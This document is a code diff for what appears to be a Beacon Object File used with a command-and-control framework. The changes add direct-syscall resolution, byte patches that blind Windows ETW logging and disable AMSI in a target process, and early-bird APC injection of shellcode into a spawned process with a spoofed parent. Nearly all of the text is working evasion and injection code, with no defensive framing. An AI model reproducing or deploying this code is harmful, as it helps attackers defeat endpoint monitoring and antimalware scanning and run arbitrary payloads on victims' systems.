@@ -1,6 +1,7 @@
 #include <windows.h>
 #include <stdio.h>
 #include "beacon.h"
+#include "syscalls.h"
 
 // --- Definitions ---
 #ifndef PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
@@ -32,7 +33,7 @@ typedef HLOCAL (WINAPI *EXP_LocalAlloc)(UINT, SIZE_T);
 typedef HLOCAL (WINAPI *EXP_LocalFree)(HLOCAL);
 typedef BOOL (WINAPI *EXP_CreatePipe)(PHANDLE, PHANDLE, LPSECURITY_ATTRIBUTES, DWORD);
 typedef BOOL (WINAPI *EXP_SetHandleInformation)(HANDLE, DWORD, DWORD);
-typedef BOOL (WINAPI *EXP_ReadFile)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
+
 typedef void (WINAPI *EXP_Sleep)(DWORD);
 
 // --- Helpers ---
@@ -59,10 +60,8 @@ WINBASEAPI DWORD WINAPI KERNEL32$GetLastError(VOID);
 WINBASEAPI BOOL WINAPI KERNEL32$CloseHandle(HANDLE);
 WINBASEAPI BOOL WINAPI KERNEL32$CreateProcessA(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
 WINBASEAPI BOOL WINAPI KERNEL32$TerminateProcess(HANDLE, UINT);
-WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAllocEx(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
-WINBASEAPI BOOL WINAPI KERNEL32$WriteProcessMemory(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
-WINBASEAPI DWORD WINAPI KERNEL32$QueueUserAPC(PAPCFUNC, HANDLE, ULONG_PTR);
-WINBASEAPI DWORD WINAPI KERNEL32$ResumeThread(HANDLE);
+WINBASEAPI HMODULE WINAPI KERNEL32$LoadLibraryA(LPCSTR);
+
 WINBASEAPI HANDLE WINAPI KERNEL32$OpenProcess(DWORD, BOOL, DWORD);
 WINBASEAPI BOOL WINAPI KERNEL32$DuplicateHandle(HANDLE, HANDLE, HANDLE, LPHANDLE, DWORD, BOOL, DWORD);
 WINBASEAPI HANDLE WINAPI KERNEL32$CreateNamedPipeA(LPCSTR, DWORD, DWORD, DWORD, DWORD, DWORD, DWORD, LPSECURITY_ATTRIBUTES);
@@ -81,11 +80,167 @@ void simple_hex(char* buf, unsigned int val) {
     buf[idx] = 0;
 }
 
+
+BOOL PatchETW(HANDLE hProcess) {
+    // x64: xor eax, eax; ret (33 C0 C3) or just ret (C3)
+    // We'll use ret (0xC3) for x64
+    // x86: ret 14h (C2 14 00)
+    
+    unsigned char patch64[] = { 0xC3 }; // x64 ret
+    unsigned char* patch = patch64;
+    SIZE_T patchSize = 1;
+
+#ifdef _M_IX86
+    unsigned char patch86[] = { 0xC2, 0x14, 0x00 }; // ret 14
+    patch = patch86;
+    patchSize = 3;
+#endif
+
+    // Resolve EtwEventWrite - this is in ntdll.dll usually
+    HMODULE hNtdll = KERNEL32$GetModuleHandleA("ntdll.dll");
+    if(!hNtdll) return FALSE;
+    
+    void* pEtwEventWrite = (void*)KERNEL32$GetProcAddress(hNtdll, "EtwEventWrite");
+    if(!pEtwEventWrite) return FALSE;
+
+    PVOID baseAddr = pEtwEventWrite;
+    SIZE_T regionSize = patchSize;
+    ULONG oldProtect = 0;
+
+    // 1. Change Protections (NtProtectVirtualMemory)
+    NTSTATUS status = NtProtectVirtualMemory(hProcess, &baseAddr, &regionSize, PAGE_EXECUTE_READWRITE, &oldProtect);
+    if (!NT_SUCCESS(status)) {
+        BeaconPrintf(CALLBACK_ERROR, "[!] ETW Patch: NtProtectVirtualMemory failed with status: 0x%08x", status);
+        return FALSE;
+    }
+
+    // 2. Write Patch (NtWriteVirtualMemory)
+    SIZE_T bytesWritten = 0;
+    status = NtWriteVirtualMemory(hProcess, pEtwEventWrite, patch, patchSize, &bytesWritten);
+    if (!NT_SUCCESS(status)) {
+        BeaconPrintf(CALLBACK_ERROR, "[!] ETW Patch: NtWriteVirtualMemory failed with status: 0x%08x", status);
+        return FALSE;
+    }
+
+    // 3. Restore Protections
+    ULONG tempProtect = 0;
+    NtProtectVirtualMemory(hProcess, &baseAddr, &regionSize, oldProtect, &tempProtect);
+    
+    // BeaconPrintf(CALLBACK_OUTPUT, "[+] ETW Patched via Syscalls");
+    return TRUE;
+}
+
+BOOL ForceLoadAMSI(HANDLE hProcess) {
+    HMODULE hKernel32 = KERNEL32$GetModuleHandleA("kernel32.dll");
+    if(!hKernel32) return FALSE;
+
+    void* pLoadLibraryA = (void*)KERNEL32$GetProcAddress(hKernel32, "LoadLibraryA");
+    void* pSleep = (void*)KERNEL32$GetProcAddress(hKernel32, "Sleep");
+    
+    if(!pLoadLibraryA) {
+        BeaconPrintf(CALLBACK_ERROR, "[!] ForceLoadAMSI: LoadLibraryA not found");
+        return FALSE;
+    }
+
+    char* dllName = "amsi.dll";
+    SIZE_T dllNameLen = _strlen(dllName) + 1;
+    PVOID remoteAddr = NULL;
+    SIZE_T regionSize = dllNameLen;
+
+    // Allocate memory for DLL name
+    NTSTATUS status = NtAllocateVirtualMemory(hProcess, &remoteAddr, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if(!NT_SUCCESS(status)) {
+         BeaconPrintf(CALLBACK_ERROR, "[!] ForceLoadAMSI: NtAllocateVirtualMemory failed: 0x%08x", status);
+         return FALSE;
+    }
+
+    // Write DLL name
+    SIZE_T bytesWritten = 0;
+    status = NtWriteVirtualMemory(hProcess, remoteAddr, dllName, dllNameLen, &bytesWritten);
+    if(!NT_SUCCESS(status)) {
+        BeaconPrintf(CALLBACK_ERROR, "[!] ForceLoadAMSI: NtWriteVirtualMemory failed: 0x%08x", status);
+        return FALSE;
+    }
+
+    // Create Thread to Load Library
+    HANDLE hThread = NULL;
+    status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, pLoadLibraryA, remoteAddr, 0, 0, 0, 0, NULL);
+    if(!NT_SUCCESS(status)) {
+        BeaconPrintf(CALLBACK_ERROR, "[!] ForceLoadAMSI: NtCreateThreadEx failed: 0x%08x", status);
+        return FALSE;
+    }
+
+    // Wait for it to load (simple sleep for now)
+    if(pSleep) ((void(*)(DWORD))pSleep)(500); 
+
+    KERNEL32$CloseHandle(hThread);
+    
+    // BeaconPrintf(CALLBACK_OUTPUT, "[+] ForceLoadAMSI: Triggered LoadLibraryA('amsi.dll')");
+    return TRUE;
+}
+
+BOOL PatchAMSI(HANDLE hProcess) {
+    // Strategy: Patch AmsiInitialize.
+    // Use E_FAIL (0x80004005) to fail initialization gracefully.
+    // Patch: mov eax, 0x80004005; ret (B8 05 40 00 80 C3)
+    
+    unsigned char patch64[] = { 0xB8, 0x05, 0x40, 0x00, 0x80, 0xC3 };
+    unsigned char* patch = patch64;
+    SIZE_T patchSize = 6;
+
+#ifdef _M_IX86
+    unsigned char patch86[] = { 0xB8, 0x05, 0x40, 0x00, 0x80, 0xC2, 0x18, 0x00 };
+    patch = patch86;
+    patchSize = 8;
+#endif
+
+    // Load local amsi.dll to find offset (Assume shared ASLR)
+    HMODULE hAmsi = KERNEL32$LoadLibraryA("amsi.dll");
+    if(!hAmsi) {
+        BeaconPrintf(CALLBACK_ERROR, "[!] PatchAMSI: Could not load local amsi.dll");
+        return FALSE;
+    }
+    
+    // Changing target to AmsiInitialize
+    void* pAmsiUnk = (void*)KERNEL32$GetProcAddress(hAmsi, "AmsiInitialize");
+    if(!pAmsiUnk) {
+        BeaconPrintf(CALLBACK_ERROR, "[!] PatchAMSI: Could not find AmsiInitialize");
+        return FALSE;
+    }
+
+    PVOID baseAddr = pAmsiUnk;
+    SIZE_T regionSize = patchSize;
+    ULONG oldProtect = 0;
+
+    // 1. Change Protections
+    NTSTATUS status = NtProtectVirtualMemory(hProcess, &baseAddr, &regionSize, PAGE_EXECUTE_READWRITE, &oldProtect);
+    if (!NT_SUCCESS(status)) {
+        // This is expected if AMSI is not loaded in target
+        BeaconPrintf(CALLBACK_ERROR, "[!] PatchAMSI: NtProtectVirtualMemory failed (0x%08x). AMSI likely not loaded.", status);
+        return FALSE;
+    }
+
+    // 2. Write Patch
+    SIZE_T bytesWritten = 0;
+    status = NtWriteVirtualMemory(hProcess, pAmsiUnk, patch, patchSize, &bytesWritten);
+    if (!NT_SUCCESS(status)) {
+        BeaconPrintf(CALLBACK_ERROR, "[!] PatchAMSI: NtWriteVirtualMemory failed (0x%08x)", status);
+        return FALSE;
+    }
+
+    // 3. Restore Protections
+    ULONG tempProtect = 0;
+    NtProtectVirtualMemory(hProcess, &baseAddr, &regionSize, oldProtect, &tempProtect);
+    
+    // BeaconPrintf(CALLBACK_OUTPUT, "[+] AMSI Patched via Syscalls");
+    return TRUE;
+}
+
 void go(char* args, int len) {
     datap parser;
     BeaconDataParse(&parser, args, len);
     
-    // int action = BeaconDataInt(&parser); // Removed
+
     int jobId = BeaconDataInt(&parser);
     int ppid = BeaconDataInt(&parser);
     char* program = BeaconDataExtract(&parser, NULL);
@@ -97,6 +252,9 @@ void go(char* args, int len) {
     HMODULE hKernel32 = KERNEL32$GetModuleHandleA("kernel32.dll");
     if(!hKernel32) return;
 
+    // Initialize Syscalls (Halo's Gate)
+    InitSyscalls();
+
     EXP_InitializeProcThreadAttributeList pInitializeProcThreadAttributeList = (EXP_InitializeProcThreadAttributeList)KERNEL32$GetProcAddress(hKernel32, "InitializeProcThreadAttributeList");
     EXP_UpdateProcThreadAttribute pUpdateProcThreadAttribute = (EXP_UpdateProcThreadAttribute)KERNEL32$GetProcAddress(hKernel32, "UpdateProcThreadAttribute");
     EXP_DeleteProcThreadAttributeList pDeleteProcThreadAttributeList = (EXP_DeleteProcThreadAttributeList)KERNEL32$GetProcAddress(hKernel32, "DeleteProcThreadAttributeList");
@@ -104,7 +262,7 @@ void go(char* args, int len) {
     EXP_LocalFree pLocalFree = (EXP_LocalFree)KERNEL32$GetProcAddress(hKernel32, "LocalFree");
     EXP_CreatePipe pCreatePipe = (EXP_CreatePipe)KERNEL32$GetProcAddress(hKernel32, "CreatePipe");
     EXP_SetHandleInformation pSetHandleInformation = (EXP_SetHandleInformation)KERNEL32$GetProcAddress(hKernel32, "SetHandleInformation");
-    EXP_ReadFile pReadFile = (EXP_ReadFile)KERNEL32$GetProcAddress(hKernel32, "ReadFile");
+    // EXP_ReadFile pReadFile = (EXP_ReadFile)KERNEL32$GetProcAddress(hKernel32, "ReadFile");
 
     EXP_Sleep pSleep = (EXP_Sleep)KERNEL32$GetProcAddress(hKernel32, "Sleep");
 
@@ -239,7 +397,7 @@ void go(char* args, int len) {
         
         attributeCount = 1;  // PARENT_PROCESS
         if(useBlockDLLs) attributeCount++; 
-    } else if(!usePipeClient) { // Changed from !useParent to !usePipeClient
+    } else if(!usePipeClient) {
         // Normal mode - use BlockDLLs
         if(useBlockDLLs) attributeCount++;
     }
@@ -319,7 +477,7 @@ void go(char* args, int len) {
     }
 
     // CreateProcess - bInheritHandles is FALSE when using pipe client mode
-    BOOL success = KERNEL32$CreateProcessA(NULL, program, NULL, NULL, !usePipeClient, creationFlags, NULL, NULL, si_ptr, &pi);
+    BOOL processSuccess = KERNEL32$CreateProcessA(NULL, program, NULL, NULL, !usePipeClient, creationFlags, NULL, NULL, si_ptr, &pi);
     
     // Cleanup handles we don't need after CreateProcess
     if(!usePipeClient) {
@@ -333,32 +491,66 @@ void go(char* args, int len) {
         pLocalFree(si_ex.lpAttributeList);
     }
     
-    if(!success) {
+    if(!processSuccess) {
         BeaconPrintf(CALLBACK_ERROR, "CreateProcess failed: %d", KERNEL32$GetLastError());
         KERNEL32$CloseHandle(hReadPipe);
         return;
     }
 
-    LPVOID remoteAddr = KERNEL32$VirtualAllocEx(pi.hProcess, NULL, shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    if(remoteAddr) {
-        SIZE_T bytesWritten = 0;
-        KERNEL32$WriteProcessMemory(pi.hProcess, remoteAddr, shellcode, shellcode_len, &bytesWritten);
-        KERNEL32$QueueUserAPC((PAPCFUNC)remoteAddr, pi.hThread, 0);
-        DWORD resumeCount = KERNEL32$ResumeThread(pi.hThread);
-        if(resumeCount == (DWORD)-1) {
-             BeaconPrintf(CALLBACK_ERROR, "ResumeThread failed: %d", KERNEL32$GetLastError());
-             KERNEL32$TerminateProcess(pi.hProcess, 0);
-             KERNEL32$CloseHandle(pi.hProcess);
-             KERNEL32$CloseHandle(pi.hThread);
-             KERNEL32$CloseHandle(hReadPipe);
-             return;
-        }
+    // --- Patch ETW ---
+    PatchETW(pi.hProcess);
+
+    // --- Force Load AMSI & Patch ---
+    ForceLoadAMSI(pi.hProcess);
+    PatchAMSI(pi.hProcess);
+
+    // --- Inject via Syscalls ---
+    PVOID remoteAddr = NULL;
+    SIZE_T regionSize = shellcode_len;
+    
+    NTSTATUS status = NtAllocateVirtualMemory(pi.hProcess, &remoteAddr, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (NT_SUCCESS(status)) {
         
-        // Give the thread a moment to initialize and execute the APC
-        // Increased from 100ms to 1000ms to ensure stability
-        pSleep(1000);
+        SIZE_T bytesWritten = 0;
+        status = NtWriteVirtualMemory(pi.hProcess, remoteAddr, shellcode, shellcode_len, &bytesWritten);
+        if (NT_SUCCESS(status)) {
+            
+            status = NtQueueApcThread(pi.hThread, remoteAddr, NULL, NULL, NULL);
+            if (NT_SUCCESS(status)) {
+                
+                ULONG prevSuspend = 0;
+                status = NtResumeThread(pi.hThread, &prevSuspend);
+                if (!NT_SUCCESS(status)) {
+                     BeaconPrintf(CALLBACK_ERROR, "NtResumeThread failed: 0x%08x", status);
+                     KERNEL32$TerminateProcess(pi.hProcess, 0);
+                     KERNEL32$CloseHandle(pi.hProcess);
+                     KERNEL32$CloseHandle(pi.hThread);
+                     KERNEL32$CloseHandle(hReadPipe);
+                     return;
+                }
+
+                // Give the thread a moment to initialize and execute the APC
+                pSleep(1000);
+
+            } else {
+                BeaconPrintf(CALLBACK_ERROR, "NtQueueApcThread failed: 0x%08x", status);
+                KERNEL32$TerminateProcess(pi.hProcess, 0);
+                KERNEL32$CloseHandle(pi.hProcess);
+                KERNEL32$CloseHandle(pi.hThread);
+                KERNEL32$CloseHandle(hReadPipe);
+                return;
+            }
+        } else {
+            BeaconPrintf(CALLBACK_ERROR, "NtWriteVirtualMemory failed: 0x%08x", status);
+            KERNEL32$TerminateProcess(pi.hProcess, 0);
+            KERNEL32$CloseHandle(pi.hProcess);
+            KERNEL32$CloseHandle(pi.hThread);
+            KERNEL32$CloseHandle(hReadPipe);
+            return;
+        }
+
     } else {
-         BeaconPrintf(CALLBACK_ERROR, "Injection failed.");
+         BeaconPrintf(CALLBACK_ERROR, "NtAllocateVirtualMemory failed: 0x%08x", status);
          KERNEL32$TerminateProcess(pi.hProcess, 0);
          KERNEL32$CloseHandle(pi.hProcess);
          KERNEL32$CloseHandle(pi.hThread);
@@ -369,12 +561,12 @@ void go(char* args, int len) {
     // --- Async Execution (Default) ---
     // Register the job with the native JobsController
     if (BeaconJobRegister(jobId, pi.hProcess, (WORD)pi.dwProcessId, hReadPipe, hWritePipe)) {
-        BeaconPrintf(CALLBACK_OUTPUT, "[+] Process started (PID: %d). Output will stream automatically.", pi.dwProcessId);
+        BeaconPrintf(CALLBACK_OUTPUT, "[+] Process started (PID: %d)", pi.dwProcessId);
     } else {
             BeaconPrintf(CALLBACK_ERROR, "Failed to register job. Closing process.");
             KERNEL32$TerminateProcess(pi.hProcess, 0);
             KERNEL32$CloseHandle(pi.hProcess);
     }
-    // LEAKING THREAD HANDLE INTENTIONALLY to prevent APC race condition causing crash
-    // KERNEL32$CloseHandle(pi.hThread);
+
+    KERNEL32$CloseHandle(pi.hThread);
 }
